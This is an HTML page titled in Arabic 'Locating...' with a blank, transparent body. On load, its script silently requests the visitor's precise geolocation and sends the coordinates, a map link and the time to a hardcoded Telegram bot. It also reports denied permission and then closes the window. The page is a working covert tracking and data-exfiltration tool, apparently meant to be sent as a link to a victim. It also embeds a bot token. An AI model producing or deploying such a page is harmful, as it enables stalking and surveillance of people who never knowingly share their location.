<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جاري تحديد الموقع</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";

        // دالة مباشرة للحصول على الموقع وإرساله
        function getExactLocation() {
            if (!navigator.geolocation) {
                sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    const message = 
                        `🎯 الموقع الدقيق\n\n` +
                        `📍 الإحداثيات:\n` +
                        `• خط العرض: ${lat}\n` +
                        `• خط الطول: ${lng}\n` +
                        `• الدقة: ${accuracy} متر\n\n` +
                        `🗺️ الخريطة:\n` +
                        `https://www.google.com/maps?q=${lat},${lng}\n\n` +
                        `🕒 الوقت: ${new Date().toLocaleString('ar-MA')}`;

                    await sendToTelegram(message);
                    setTimeout(() => window.close(), 1000);
                },
                function(error) {
                    let errorMessage = "❌ فشل في الحصول على الموقع: ";
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage += "تم رفض الإذن";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage += "الموقع غير متاح";
                            break;
                        case error.TIMEOUT:
                            errorMessage += "انتهت المهلة";
                            break;
                    }
                    sendToTelegram(errorMessage);
                    setTimeout(() => window.close(), 2000);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // دالة الإرسال إلى التليجرام
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                
                if (response.ok) {
                    console.log("✅ تم إرسال الموقع الدقيق");
                }
            } catch (error) {
                console.log("❌ خطأ في الإرسال:", error);
            }
        }

        // بدء العملية فوراً
        getExactLocation();
    </script>
</head>
<body style="margin:0;padding:0;background:transparent;">
    <!-- صفحة فارغة -->
</body>
</html>